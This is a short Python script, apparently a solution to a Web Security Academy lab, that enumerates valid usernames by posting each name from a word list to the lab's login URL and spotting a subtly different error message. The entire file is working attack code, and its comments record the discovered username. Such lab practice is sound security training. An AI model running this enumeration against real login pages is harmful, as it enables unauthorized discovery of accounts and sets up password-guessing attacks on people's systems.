import requests as req 

url = "https://0a0100f1044d67dfc25a25b200750066.web-security-academy.net/login"
password = "jackass"

user_file = open("../usernames")

while user := user_file.readline().strip():
    print(user)
    dat = {"username":user,"password":password}
    x = req.post(url, dat)
    if "Invalid username or password." not in x.text:
        print(x.text)
        # We discover that in this case the error message doesnt have a period .
        # User discovered is americas 